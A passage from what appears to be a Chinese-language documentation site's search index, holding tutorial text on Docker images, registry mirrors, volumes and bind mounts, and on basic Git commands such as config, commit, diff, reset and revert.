\u865a\u62df\u673a\u865a\u62df\u5316\u7684\u662f\u786c\u4ef6\uff0c\u56e0\u6b64\u5bb9\u5668\u66f4\u5bb9\u6613\u79fb\u690d\uff0c\u6548\u7387\u4e5f\u66f4\u9ad8\u3002</p> <p>\u6ce8\uff1a\u865a\u62df\u673a\u548c\u5bb9\u5668\u53ef\u4ee5\u5e76\u5b58\uff0c\u5373\u4e00\u4e2a\u865a\u62df\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u53ef\u4ee5\u6709\u591a\u4e2a\u5bb9\u5668\u3002</p>"},{"location":"tools/docker/install/#_2","title":"\u4e09\u5927\u6838\u5fc3\uff1a\u955c\u50cf\u3001\u5bb9\u5668\u3001\u4ed3\u5e93","text":"<p>\u4e00\u3001\u955c\u50cf</p> <p>Docker \u955c\u50cf\u662f\u4e00\u4e2a\u7279\u6b8a\u7684 \u53ea\u8bfb \u6587\u4ef6\u7cfb\u7edf\uff0c\u9664\u4e86\u63d0\u4f9b\u5bb9\u5668\u8fd0\u884c\u65f6\u6240\u9700\u7684\u7a0b\u5e8f\u3001\u5e93\u3001\u8d44\u6e90\u3001\u914d\u7f6e\u7b49\u6587\u4ef6\u5916\uff0c\u8fd8\u5305\u542b\u4e86\u4e00\u4e9b\u4e3a\u8fd0\u884c\u65f6\u51c6\u5907\u7684\u4e00\u4e9b\u914d\u7f6e\u53c2\u6570\uff08\u5982\u533f\u540d\u5377\u3001\u73af\u5883\u53d8\u91cf\u3001\u7528\u6237\u7b49\uff09</p> <p>\u4e8c\u3001\u5bb9\u5668</p> <p>\u5bb9\u5668\u662f\u57fa\u4e8e \u955c\u50cf \u521b\u5efa\u7684\u5e94\u7528\u8fd0\u884c \u5b9e\u4f8b\u3002\u5bb9\u5668\u53ef\u4ee5\u88ab\u521b\u5efa\u3001\u542f\u52a8\u3001\u505c\u6b62\u3001\u5220\u9664\u3001\u6682\u505c\u7b49\u3002</p> <p>\u5404\u4e2a\u5bb9\u5668\u4e4b\u95f4\u90fd\u662f\u5f7c\u6b64\u9694\u79bb\u3001\u4e92\u4e0d\u53ef\u89c1\u7684\u3002</p> <p>\u53ef\u4ee5\u628a\u5bb9\u5668\u770b\u505a\u662f\u4e00\u4e2a\u7b80\u6613\u7248\u7684 Linux \u7cfb\u7edf\u3002</p> <p>\u4e09\u3001\u4ed3\u5e93</p> <p>\u4e00\u4e2a \u6ce8\u518c\u670d\u52a1\u5668\uff08Docker Registry\uff09 \u4e2d\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u4ed3\u5e93\uff08Repository\uff09\uff1a\u6bcf\u4e00\u4e2a\u4ed3\u5e93\u5bf9\u5e94\u4e00\u7c7b\u955c\u50cf\uff01</p> <p>\u6bcf\u4e2a\u4ed3\u5e93\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u6807\u7b7e\uff08Tag\uff09\uff1a\u6bcf\u4e2a\u6807\u7b7e\u5bf9\u5e94\u4e00\u4e2a\u955c\u50cf\u7248\u672c\uff0c\u6807\u7b7e\u53ea\u6807\u6ce8\u7248\u672c\u4fe1\u606f\uff0c\u4e0d\u6807\u8bc6\u955c\u50cf\u5185\u5bb9\uff01</p> <p>\u955c\u50cf\u4ed3\u5e93\u662f Docker \u7528\u6765\u96c6\u4e2d\u5b58\u653e\u955c\u50cf\u6587\u4ef6\u7684\u5730\u65b9\u7c7b\u4f3c\u4e8e\u6211\u4eec\u4e4b\u524d\u5e38\u7528\u7684\u4ee3\u7801\u4ed3\u5e93\u3002</p> <p></p>"},{"location":"tools/docker/install/#docker-hub-registry","title":"Docker Hub Registry","text":"<p>\u4e00\u4e2a Registry\uff08\u6ce8\u518c\u670d\u52a1\u5668\uff09\u53ef\u4ee5\u5b58\u653e\u591a\u4e2a Repository\uff08\u4ed3\u5e93\uff09</p> <p>Example</p> <p>\u4ed3\u5e93\u5730\u5740\uff1aprivate-docker.com/ubuntu:latest</p> <ul> <li> <p>private-docker.com\uff1a\u6ce8\u518c\u670d\u52a1\u5668\u5730\u5740</p> </li> <li> <p>ubuntu\uff1a\u4ed3\u5e93\u540d</p> </li> <li> <p>latest\uff1a\u955c\u50cf\u7248\u672c</p> </li> </ul> <p>\u767b\u9646 Docker Hub\uff1adocker login</p> <p>\u641c\u7d22\uff1adocker search</p> <p>\u62c9\u53d6\uff1adocker pull</p>"},{"location":"tools/docker/install/#_3","title":"\u5b89\u88c5\u5e76\u6362\u6e90","text":"<ul> <li>\u65b9\u6cd5\u4e00\uff1a\u76f4\u63a5\u4e0b\u8f7d Docker Desktop</li> <li>\u65b9\u6cd5\u4e8c\uff1alinux \u5e73\u53f0\u53ef\u5b89\u88c5 Docker Engine</li> </ul> <p>Note</p> <p>2022 \u5e74 5 \u6708\u63a8\u51fa\u4e86 Linux \u7248\u672c\u7684 Docker Desktop\uff0c\u6b64\u524d\u53ea\u80fd\u901a\u8fc7\u5b89\u88c5 Docker Engine \u6765\u4f7f\u7528\uff0c\u6b64\u5916\u63a8\u8350\u5b89\u88c5 Docker Compose\uff0c\u7528\u4e8e\u591a\u5bb9\u5668\u5e94\u7528\u3002</p> <p>\u4e3a\u4e86\u52a0\u5feb\u955c\u50cf\u4e0b\u8f7d\u901f\u5ea6\uff0c\u9996\u5148\u8fdb\u884c\u6362\u6e90\uff0c\u56fd\u5185\u7684\u955c\u50cf\u6e90\u6709</p> <ul> <li>docker \u5b98\u65b9\u4e2d\u56fd\u533a <code>https://registry.docker-cn.com</code></li> <li>\u7f51\u6613 <code>http://hub-mirror.c.163.com</code></li> <li>ustc <code>http://docker.mirrors.ustc.edu.cn</code></li> <li>\u963f\u91cc\u4e91 <code>http://&lt;\u4f60\u7684ID&gt;.mirror.aliyuncs.com</code></li> </ul> <p>Note</p> <ul> <li>\u914d\u7f6e <code>registry-mirrors</code> \u52a1\u5fc5\u4f7f\u7528 <code>http</code>\uff0c\u800c\u4e0d\u8981\u7528 <code>https</code>\uff0c\u5426\u5219\u4f1a\u663e\u793a <code>No certs for egitstry.docker.com</code></li> <li>\u914d\u7f6e <code>insecure-registries</code> \u4e0d\u8981\u4efb\u4f55<code>http</code>\u5934\uff0c\u5426\u5219\u5931\u8d25</li> </ul> <ul> <li> <p>Windows\uff0c\u542f\u52a8 Docker \u56fe\u5f62\u5316\u754c\u9762\uff0c\u5982\u4e0b\u56fe\u4fee\u6539\u3002</p> </li> <li> <p>Mac\uff0c\u7c7b\u4f3c Windows\uff0c\u5728 Docker Engine \u4e2d\u6dfb\u52a0 registry-mirrors \u5373\u53ef</p> </li> <li> <p>Linux\uff0c\u7f16\u8f91<code>/etc/docker/daemon.json</code>\uff0c\u4fee\u6539\u5b8c\u91cd\u542f\u3002</p> </li> </ul> <p>\u4fee\u6539\u5b8c\u6bd5\u540e\uff0c\u901a\u8fc7<code>docker info</code>\u67e5\u770b\u662f\u5426\u5b58\u5728 Registry Mirrors\u3002</p> <pre><code>{\n  \"registry-mirrors\": [\n    \"https://docker.mirrors.ustc.edu.cn/\",\n    \"http://hub-mirror.c.163.com\",\n    \"https://registry.docker-cn.com\"\n  ]\n}\n</code></pre> <p></p>"},{"location":"tools/docker/volumn/","title":"\u6570\u636e\u7ba1\u7406","text":"<p>\u5728\u5bb9\u5668\u4e2d\u7ba1\u7406\u6570\u636e\u4e3b\u8981\u6709\u4e24\u79cd\u65b9\u5f0f\uff1a</p> <ul> <li>\u6570\u636e\u5377\uff08Volumes\uff09</li> <li>\u6570\u636e\u5377\u5bb9\u5668</li> <li>\u6302\u8f7d\u4e3b\u673a\u76ee\u5f55 (Bind mounts)</li> </ul>"},{"location":"tools/docker/volumn/#_2","title":"\u6302\u8f7d\u6570\u636e\u5377","text":"<p>\u4e00\u3001\u521b\u5efa\u3001\u67e5\u770b\u3001\u8be6\u60c5\u3001\u5220\u9664</p> <pre><code>docker volume create &lt;volume_name&gt;\n\ndocker volume ls\n\ndocker volume inspect &lt;volume_name&gt;\n\ndocker volume rm &lt;volume_name&gt;\n\n# \u65e0\u4e3b\u7684\u6570\u636e\u5377\u53ef\u80fd\u4f1a\u5360\u636e\u5f88\u591a\u7a7a\u95f4\uff0c\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u6e05\u7406\uff1a\ndocker volume prune\n</code></pre> <p>\u4e8c\u3001\u542f\u52a8\u4e00\u4e2a\u6302\u8f7d\u6570\u636e\u5377\u7684\u5bb9\u5668</p> <p>\u5728\u7528<code>docker run</code>\u547d\u4ee4\u7684\u65f6\u5019\uff0c\u4f7f\u7528<code>--mount</code>\u6807\u8bb0\u6765\u5c06<code>\u6570\u636e\u5377</code>\u6302\u8f7d\u5230\u5bb9\u5668\u91cc\u3002\u4e00\u6b21<code>docker run</code>\u53ef\u4ee5\u6302\u8f7d\u591a\u4e2a<code>\u6570\u636e\u5377</code>\u3002</p> <pre><code>#1. \u6302\u8f7d\u4e00\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u6570\u636e\u5377\ndocker run -itd --name \"&lt;container_name&gt;\" --mount source=&lt;volume_name&gt;,target=/path/to/target &lt;image_id&gt;\n\n#2. \u521b\u5efa\u5e76\u6302\u8f7d\u6570\u636e\u5377\ndocker run -itd --name \"&lt;container_name&gt;\" -v &lt;volume_name&gt;:/path/to/target &lt;image_id&gt;\n\n# \u4f8b\ndocker run -itd --name \"ubuntu\" --mount source=my-vol,target=/volume 01187e1edca1\ndocker run -itd --name \"ubuntu_create\" -v my-vol2:/volume 01187e1edca1\n</code></pre> <p><code>\u6570\u636e\u5377</code>\u4fe1\u606f\u5728<code>\u201cmounts\u201d</code>\u4e0b</p> <pre><code>docker inspect ubuntu\n\n\"Mounts\": [\n    {\n    \"Type\": \"volume\",\n    \"Name\": \"my-vol\",\n    \"Source\": \"/var/lib/docker/volumes/my-vol/_data\",\n    \"Destination\": \"/volume\",\n    \"Driver\": \"local\",\n    \"Mode\": \"z\",\n    \"RW\": true,\n    \"Propagation\": \"\"\n    }\n],\n</code></pre> <p>\u4e09\u3001\u6570\u636e\u5377\u5bb9\u5668</p> <p>\u5982\u679c\u7528\u6237\u9700\u8981\u5728\u591a\u4e2a\u5bb9\u5668\u4e4b\u95f4\u5171\u4eab\u4e00\u4e9b\u6301\u7eed\u66f4\u65b0\u7684\u6570\u636e\uff0c\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u662f\u4f7f\u7528**\u6570\u636e\u5377\u5bb9\u5668**\u3002\u6570\u636e\u5377\u5bb9\u5668\u4e5f\u662f\u4e00\u4e2a\u5bb9\u5668\uff0c\u4f46\u662f\u5b83\u7684\u76ee\u7684\u662f\u4e13\u95e8\u7528\u6765\u63d0\u4f9b\u6570\u636e\u5377\u4f9b\u5176\u4ed6\u5bb9\u5668\u6302\u8f7d\u3002</p> <pre><code>docker run -itd --name \"&lt;container_name&gt;\" --volumes-from &lt;container_name/id&gt;\n</code></pre> <p>\u4f7f\u7528<code>--volumes-from</code>\u53ef\u4ee5\u6302\u8f7d\u6307\u5b9a\u5bb9\u5668\u7684\u6570\u636e\u5377\uff0c\u53ef\u4ee5\u591a\u6b21\u4f7f\u7528<code>--volumes-from</code>\u53c2\u6570\u6765\u4ece\u591a\u4e2a\u5bb9\u5668\u6302\u8f7d\u591a\u4e2a\u6570\u636e\u5377\u3002</p> <p>\u672c\u8d28\u4e0a\u6765\u8bf4\uff0c\u90fd\u662f\u6302\u8f7d\u6570\u636e\u5377\u7f62\u4e86\u3002</p> <p>TODO\uff1a\u5229\u7528\u6570\u636e\u5377\u5bb9\u5668\u6765\u5907\u4efd\u3001\u56de\u590d\u3001\u8fc1\u79fb\u6570\u636e\u5377</p>"},{"location":"tools/docker/volumn/#_3","title":"\u6302\u8f7d\u672c\u5730\u4e3b\u673a","text":"<p>\u4e00\u3001\u6302\u8f7d\u672c\u5730\u4e3b\u673a\u76ee\u5f55</p> <p>\u6307\u5b9a<code>type=bind</code>\u53ef\u4ee5\u6302\u8f7d\u672c\u5730\u4e3b\u673a\u7684\u76ee\u5f55\u5230\u5bb9\u5668\u4e2d\u53bb\uff0c\u672c\u5730\u76ee\u5f55\u5fc5\u987b\u662f\u5df2\u7ecf**\u5b58\u5728\u7684\u7edd\u5bf9\u8def\u5f84**\u3002</p> <pre><code>docker run -itd --name \"&lt;container_name&gt;\" --mount type=bind,source=/path/to/local,target=/path/to/target &lt;image_id&gt;\n\n# \u4f8b $HOME = /Users/happytsing\ndocker run -itd --name \"ubuntu_bind\" --mount type=bind,source=$HOME/Desktop,target=/volume 01187e1edca1\n</code></pre> <p>Update: \u901a\u8fc7 -v \u6302\u8f7d</p> <pre><code>docker run -v /mac:/docker -w /docker -it ubuntu bash\ndocker run  -v `pwd`:`pwd` -w `pwd` -it  ubuntu pwd\n</code></pre> <p>\u672c\u5730\u76ee\u5f55\u7684\u8def\u5f84\u5fc5\u987b\u662f\u7edd\u5bf9\u8def\u5f84\uff0c\u4ee5\u524d\u4f7f\u7528 <code>-v</code> \u53c2\u6570\u65f6\u5982\u679c\u672c\u5730\u76ee\u5f55\u4e0d\u5b58\u5728 Docker \u4f1a\u81ea\u52a8\u4e3a\u4f60\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u4f7f\u7528 <code>--mount</code> \u53c2\u6570\u65f6\u5982\u679c\u672c\u5730\u76ee\u5f55\u4e0d\u5b58\u5728\uff0cdocker \u4f1a\u62a5\u9519\u3002</p> <p><code>-w</code> \u7528\u4e8e\u6307\u5b9a\u5bb9\u5668\u5185\u7684\u5de5\u4f5c\u76ee\u5f55\u3002</p> <p>\u67e5\u770b\u6570\u636e\u5377\u4fe1\u606f\uff1a</p> <pre><code>docker inspect ubuntu_bind\n\n\"Mounts\": [\n    {\n    \"Type\": \"bind\",\n    \"Source\": \"/Users/happytsing/Desktop\",\n    \"Destination\": \"/volume\",\n    \"Mode\": \"\",\n    \"RW\": true,\n    \"Propagation\": \"rprivate\"\n    }\n],\n</code></pre> <p>\u4e8c\u3001\u6302\u8f7d\u672c\u5730\u4e3b\u673a\u6587\u4ef6</p> <pre><code>docker run -itd --name \"&lt;container_name&gt;\" --mount type=bind,source=/path/to/local_file,target=/path/to/target_file &lt;image_id&gt;\n\n# Example\ndocker run -itd --name \"ubuntu_bind_file\" --mount type=bind,source=$HOME/.zshrc,target=/root/.zshrc 01187e1edca1\n</code></pre>"},{"location":"tools/docker/volumn/#docker-compose","title":"Docker Compose","text":"<p>Compose \u662f\u7528\u4e8e\u5b9a\u4e49\u548c \u8fd0\u884c\u591a\u5bb9\u5668 Docker \u5e94\u7528\u7a0b\u5e8f\u7684\u5de5\u5177\u3002\u901a\u8fc7 Compose\uff0c\u4f7f\u7528 YML \u6587\u4ef6\u6765\u914d\u7f6e\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u7684\u6240\u6709\u670d\u52a1\u3002</p> <p>\u7136\u540e\uff0c\u4f7f\u7528\u4e00\u4e2a\u547d\u4ee4\uff0c\u5c31\u53ef\u4ee5\u4ece YML \u6587\u4ef6\u914d\u7f6e\u4e2d\u521b\u5efa\u5e76\u542f\u52a8\u6240\u6709\u670d\u52a1\u3002</p>"},{"location":"tools/git/base/","title":"git\uff1a\u8001\u53f8\u673a\u4e0a\u8def","text":"<p>Note</p> <p>\u7b14\u8005\u4f7f\u7528\u7684\u662f zsh\uff0c\u5176\u9ed8\u8ba4\u914d\u7f6e\u8bb8\u591a\u9ad8\u6548\u7684 Git \u5feb\u6377\u952e\uff0c\u6709\u5173 zsh \u7684\u5b89\u88c5\u53ef\u4ee5\u53c2\u89c1\uff1aLinux \u521d\u59cb\u5316 Shell \u53ca\u63d2\u4ef6</p>"},{"location":"tools/git/base/#git-config","title":"git config","text":"<p>Common Usage</p> <pre><code>git config user.name &lt;namevalue&gt;\ngit config user.email &lt;emailvalule&gt;\n\ngit config --global --edit   # \u76f4\u63a5\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\ngit config --list            # \u67e5\u770b\u5f53\u524d\u914d\u7f6e\n</code></pre> <p>git config levels and files</p> <ul> <li>--local\uff1a\u4ed3\u5e93\u7ea7\u522b\uff0c\u914d\u7f6e\u5b58\u653e\u5728\u5f53\u524d\u4ed3\u5e93\u7684<code>.git/config</code></li> <li>--global\uff1a\u8ba1\u7b97\u673a\u7cfb\u7edf\u7528\u6237\u7ea7\u522b\uff0c\u5b58\u653e\u5728\u5bb6\u76ee\u5f55\u7684<code>~/.gitconfig</code></li> <li>--system\uff1a\u673a\u5668\u7ea7\u522b\uff0c\u6db5\u76d6\u6240\u6709\u8ba1\u7b97\u673a\u7528\u6237\u548c\u6240\u6709\u4ed3\u5e93\uff0c\u8be6\u89c1</li> </ul> <p>\u4f18\u5148\u7ea7<code>local &gt; global &gt; system</code>\uff0c\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u4f7f\u7528<code>--global</code> \u9009\u9879\u914d\u7f6e\u914d\u7f6e\u7528\u6237\u540d\u548c\u90ae\u7bb1\u5373\u53ef\uff0c<code>--local</code> \u53ef\u4ee5\u7528\u6765\u914d\u7f6e\u5bf9\u4e0d\u540c\u4ed3\u5e93\u4ee5\u4e0d\u540c\u8eab\u4efd\u63d0\u4ea4\u3002</p> <p>Other config</p> <pre><code>git config --global color.ui auto         # \u5982\u679c Git \u7ea2\u8272\u548c\u7eff\u8272\u7b49\u989c\u8272\u6709\u70b9\u5947\u602a\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u914d\u7f6e\u8fd9\u4e2a\uff0c\u8fd8\u6709\u5176\u4ed6\u7684 color \u9009\u9879\ngit config --global core.editor vim       # \u4f7f\u7528 vim \u5f53\u4f5c Git \u7684\u9ed8\u8ba4\u7f16\u8f91\u5668\uff0c\u63d0\u4ea4\u7b49\u60c5\u51b5\u4e0b Git \u9700\u8981\u4f7f\u7528\u7f16\u8f91\u5668\u3002\ngit config --global core.ignorecase false # \u6587\u4ef6\u5927\u5c0f\u5199\u654f\u611f\u3002\n</code></pre> <p>What does it do?</p> <ul> <li> <p>Github email address\uff1a<code>123456@example.com</code></p> </li> <li> <p>user.email\uff1a<code>123456@example.com</code></p> </li> </ul> <p>\u5f53<code>Github email address</code>\u4e0e<code>user.email</code>\u76f8\u7b49\u65f6\uff0c<code>git push</code>\u4e4b\u540e\uff0c\u663e\u793a\u7684 commit \u7684 Github \u7528\u6237\u5c31\u662f\u5bf9\u5e94\u90ae\u7bb1\u7684\u7528\u6237\uff0c\u5982\u679c<code>user.email</code>\u662f\u6ca1\u6709\u6ce8\u518c Github \u7684\u90ae\u7bb1\uff0c\u90a3\u4e48\u5c31\u4e0d\u4f1a\u663e\u793a\u5177\u4f53\u7684 Github \u7528\u6237\uff0c\u800c\u662f\u4e00\u4e2a\u968f\u673a\u7a7a\u767d\u5e10\u53f7\u63d0\u4ea4\u3002</p> <ul> <li>user.name\uff1a\u7ecf\u8fc7\u6d4b\u8bd5\uff0c<code>user.name</code>\u5c31\u7b97\u548c<code>Github username</code>\u76f8\u540c\uff0c\u4f3c\u4e4e\u4e5f\u65e0\u6cd5\u8bc6\u522b\uff01</li> </ul>"},{"location":"tools/git/base/#git-init","title":"git init","text":"<p>\u521d\u59cb\u5316\u4ed3\u5e93\uff0c\u6267\u884c git init \u4e4b\u540e\uff0c\u76ee\u5f55\u4e2d\u4f1a\u751f\u6210 .git \u76ee\u5f55\uff0c\u5c31\u8868\u793a\u8fd9\u662f\u4e00\u4e2a git \u4ed3\u5e93\u3002</p> <p>Params\uff1a</p> <ul> <li>--bare\uff1a\u521d\u59cb\u5316 \u88f8\u4ed3\u5e93 \uff0c\u88f8\u4ed3\u7684\u4f7f\u7528\u5e38\u89c1\u4e8e Git \u4ed3\u5e93\u670d\u52a1\u5668\uff0c\u88f8\u4ed3\u6ca1\u6709\u521b\u5efa working tree\uff0c\u6240\u4ee5\u9664\u4e86 git \u8bb0\u5f55\u5916\uff0c\u4e0d\u542b\u6709\u4efb\u4f55\u6587\u4ef6\uff0c\u4e5f\u56e0\u6b64\u4e0d\u80fd\u5728\u88f8\u4ed3\u4e2d\u6267\u884c\u4efb\u4f55 git \u64cd\u4f5c\uff0c\u53ef\u4ee5\u907f\u514d\u6c61\u67d3\u3002</li> </ul>"},{"location":"tools/git/base/#git-add","title":"git add","text":"<p>\u5c06\u4fee\u6539\u7684\u6587\u4ef6\u6dfb\u52a0\u5230\u6682\u5b58\u533a\uff1a</p> <pre><code>git add &lt;filename&gt;\n\ngit add -A            # \u63d0\u4ea4\u6240\u6709\u6587\u4ef6\ngit add --all         # \u63d0\u4ea4\u6240\u6709\u6587\u4ef6\ngit add -u            # \u63d0\u4ea4modified\u3001deleted\uff0c\u4e0d\u63d0\u4ea4new\ngit add .             # \u63d0\u4ea4modified\u3001new\uff0c\u4e0d\u63d0\u4ea4deleted\n</code></pre> <p>zsh shortcuts\uff1a<code>ga</code></p>"},{"location":"tools/git/base/#git-commit","title":"git commit","text":"<p>\u5c06\u6682\u5b58\u533a\u7684\u4fee\u6539\u63d0\u4ea4\u5230\u672c\u5730\u4ed3\u5e93\uff1a</p> <pre><code>git commit [&lt;options&gt;] [--] &lt;pathspec&gt;...\n\ngit commit                     # \u63d0\u4ea4\u6539\u52a8\uff0c\u4f1a\u6253\u5f00\u9ed8\u8ba4\u7684\u7f16\u8f91\u5668\uff0c\u7528\u4e8e\u7f16\u5199\u63d0\u4ea4\u7684 message\uff0c\u4fdd\u5b58\u4e4b\u540e\u5b8c\u6210\u63d0\u4ea4\ngit commit -m \"&lt;message info&gt;\" # \u4e0d\u6253\u5f00\u7f16\u8f91\u5668\u76f4\u63a5\u8f93\u5165 message info \u8fdb\u884c\u63d0\u4ea4\u3002\ngit commit -a\uff1a                # \u5c06\u5de5\u4f5c\u533a\u7684\u5185\u5bb9\u4e00\u5e76\u63d0\u4ea4\u3002\u5c31\u662f git add --all \u548c git commit \u7684\u7ec4\u5408\u3002\n\ngit commit --amend                # \u5c06\u6b64\u6b21\u63d0\u4ea4\u8ffd\u52a0\u5230\u4e0a\u6b21\u63d0\u4ea4\u4e0a\ngit commit --amend --reset-author # \u91cd\u7f6e\u63d0\u4ea4\u4f5c\u8005\uff0c\u5e76\u4e14\u4fee\u6539\u6700\u8fd1\u4e00\u6b21\u63d0\u4ea4\u7684\u5185\u5bb9\n</code></pre> <p>zsh shortcuts\uff1a<code>gcmsg \"&lt;message info&gt;\"</code></p>"},{"location":"tools/git/base/#git-status","title":"git status","text":"<p>\u67e5\u770b\u5de5\u4f5c\u533a\u72b6\u6001\uff1a\u672a\u88ab add \u7684\u6587\u4ef6\u4f1a\u663e\u793a Untracked\uff0c\u672a\u63d0\u4ea4\u663e\u793a Change to be committed\uff0c\u6240\u6709\u6587\u4ef6\u63d0\u4ea4\u5219\u663e\u793a nothing to commit\u3002</p> <p>zsh shortcuts\uff1a<code>gst</code></p>"},{"location":"tools/git/base/#git-log","title":"git log","text":"<p>\u67e5\u770b\u63d0\u4ea4\u5386\u53f2\uff0c\u53ef\u4ee5\u770b\u5230\u4e4b\u524d\u6240\u6709\u7684 commit \u4fe1\u606f\uff0c\u5305\u62ec commit \u7684 Hash\u3001\u65e5\u671f\u3001\u4eba\u5458\u3001\u65e5\u5fd7\u3002</p>"},{"location":"tools/git/base/#git-diff","title":"git diff","text":"<p>\u5bf9\u6bd4\u548c\u663e\u793a commit \u4e4b\u95f4\u3001\u5de5\u4f5c\u533a\uff08\u7ea2\u8272\uff09\u6216\u8005\u6682\u5b58\u533a\uff08\u7eff\u8272\uff09\u7b49\u8be6\u7ec6\u7684\u4fee\u6539\u5185\u5bb9\u3002</p> <pre><code>git diff                     # \u5de5\u4f5c\u533a\u548c\u6682\u5b58\u533a\u5bf9\u6bd4\uff0c\u5373\u4f60\u5373\u5c06\u8981 git add \u7684\u5185\u5bb9\ngit diff --cached            # \u6682\u5b58\u533a\u548c commit \u4e4b\u95f4\u7684\u5bf9\u6bd4\uff0c\u5373\u4f60\u5373\u5c06\u8981 git commit \u7684\u5185\u5bb9\ngit diff &lt;commit&gt;            # \u5de5\u4f5c\u533a\u548c\u6307\u5b9a\u7684 commit \u5bf9\u6bd4\ngit diff --cahced &lt;commit&gt;   # \u6682\u5b58\u533a\u548c\u6307\u5b9a\u7684 commit \u5bf9\u6bd4\ngit diff &lt;commit1&gt; &lt;commit2&gt; # \u663e\u793a commit2 \u5bf9\u6bd4 commit1 \u4fee\u6539\u5185\u5bb9\n</code></pre> <p>zsh shortcuts\uff1a</p> <ul> <li>git diff\uff1a<code>gd</code></li> <li>git diff --cached\uff1a<code>gdca</code></li> </ul>"},{"location":"tools/git/base/#git-show","title":"git show","text":"<p>\u8be6\u7ec6\u7684\u663e\u793a\u67d0\u6b21\u63d0\u4ea4\u7684\u4fee\u6539\u5185\u5bb9\uff0c\u7528\u6765\u67e5\u770b\u67d0\u4e2a commit \u7684\u5177\u4f53\u6539\u52a8\u5185\u5bb9\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b git show \u663e\u793a\u7684\u662f HEAD \u7684\u6539\u52a8\u3002</p> <pre><code>git show          # \u663e\u793a\u4e0a\u6b21 commit \u7684\u4fee\u6539\u5185\u5bb9\ngit show &lt;commit&gt; # \u663e\u793a\u67d0\u4e00\u6b21 commit \u7684\u4fee\u6539\u5185\u5bb9\n</code></pre>"},{"location":"tools/git/base/#git-restore","title":"git restore","text":"<p>\u64a4\u9500\u4fee\u6539\uff0c\u7528\u4e8e\u672a commit \u7684\u4fee\u6539\uff1a</p> <pre><code>git restore &lt;filename&gt;          # \u4fee\u6539\u6587\u4ef6\uff0c\u4f46\u6ca1\u6709 git add \u8be5\u6587\u4ef6\uff0c\u53ef\u6062\u590d\u6700\u65b0 commit \u7684\u63d0\u4ea4\u60c5\u51b5\ngit restore --staged &lt;filename&gt; # \u4fee\u6539\u6587\u4ef6\uff0c\u4e14 git add \u8be5\u6587\u4ef6\uff0c\u53ef\u6062\u590d\u5230\u672a git add \u7684\u60c5\u51b5\n</code></pre>"},{"location":"tools/git/base/#git-reset","title":"git reset","text":"<p>\u64a4\u9500\u4fee\u6539</p> <pre><code>git reset HEAD &lt;filename&gt;       # \u540cgit restore --staged &lt;filename&gt;\n</code></pre> <p>\u7248\u672c\u56de\u9000\uff0c\u7528\u4e8e\u5df2 commit \u7684\u4fee\u6539\uff0c\u5c06\u8be5\u6b21\u63d0\u4ea4\u4e4b\u540e\u7684\u6240\u6709\u63d0\u4ea4\u90fd\u4e22\u5f03\u3002</p> <pre><code>git reset --hard HEAD^                 # \u56de\u9000\u5230\u4e0a\u4e00\u4e2a\u7248\u672c\uff0c\u5982\u679c\u662f HEAD^^ \u5219\u56de\u9000\u5230\u4e0a\u4e0a\u4e2a\u7248\u672c\uff0c\u4ee5\u6b64\u7c7b\u63a8\ngit reset --hard HEAD~n                # \u56de\u9000\u5230\u4e0a n \u4e2a\u7248\u672c\ngit reset --hard HEAD &lt;commit id&gt;      # \u5b9a\u4f4d\u5230commit id\uff08\u7248\u672c\u53f7\uff09\u5904\n\n# \u83b7\u53d6commit id,\u4e24\u79cd\u65b9\u6cd5\uff1a\ngit log\ngit reflog\n</code></pre> <p>Note</p> <p>\u5982\u679c\u662f\u5df2\u7ecf\u63a8\u5165\u8fdc\u7a0b\u4ed3\u5e93\u7684\u5206\u652f\uff0c\u7981\u6b62 \u4f7f\u7528 <code>git reset</code>\uff0c\u9664\u975e\u4f60\u975e\u5e38\u6e05\u695a\u7684\u77e5\u9053\u81ea\u5df1\u5728\u505a\u4ec0\u4e48\uff0c\u5426\u5219 \u4eba\u6c11\u4f1a\u75db\u6068\u4f60\uff0c\u91ce\u72d7\u4f1a\u8ffd\u54ac\u4f60\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u8bd5\u8bd5 <code>git revert</code>\u3002</p> <p>\u9664\u4e0a\u8ff0\u7528\u6cd5\u4e4b\u5916\uff0c<code>git reset</code> \u8fd8\u6709 <code>--mixed</code> \u548c <code>--soft</code> \u7b49\u53c2\u6570\uff0c\u5177\u4f53\u53ef\u4ee5\u81ea\u5df1 Google \u4e86\u89e3\u3002</p> <p>\u793a\u4f8b\uff1a</p> <p></p> <p>\u8fd0\u884c\u547d\u4ee4<code>git reset</code>\u56de\u9000\u7248\u672c\u5230\u7b2c\u4e8c\u6b21\u63d0\u4ea4\uff08add b)\uff1a</p> <pre><code>~ git reset --hard  fc442e084dd0a9b70c41bac313b2bc3a7c148a5b\nHEAD is now at fc442e0 add b\n</code></pre> <p>\u518d\u6b21\u8fd0\u884c<code>git log</code></p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u5df2\u7ecf\u56de\u5230\u4e86\u7b2c\u4e8c\u6b21\u63d0\u4ea4\uff0c\u4e14\u4e4b\u540e\u7684\u63d0\u4ea4\u90fd\u5df2\u7ecf\u88ab\u5220\u9664\uff01</p>"},{"location":"tools/git/base/#git-revert","title":"git revert","text":"<p>\u64a4\u9500\u67d0\u4e00\u6b21\u63d0\u4ea4\u3002\u5c06\u67d0\u4e00\u6b21\u63d0\u4ea4\u7684\u4fee\u6539\u6062\u590d\u56de\u53bb\u3002</p> <pre><code>git revert &lt;commit id&gt;  # \u5c06\u6307\u5b9a commit id \u7684\u63d0\u4ea4\u4fee\u6539\u7684\u5185\u5bb9\u6062\u590d\uff0c\u5bf9\u5176\u4ed6\u6240\u6709\u63d0\u4ea4\u6ca1\u6709\u5f71\u54cd\uff01\n</code></pre> <p>\u518d\u6b21\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6 c\uff0c\u63d0\u4ea4\uff1a</p> <p></p> <p>\u8fd0\u884c\u547d\u4ee4<code>git 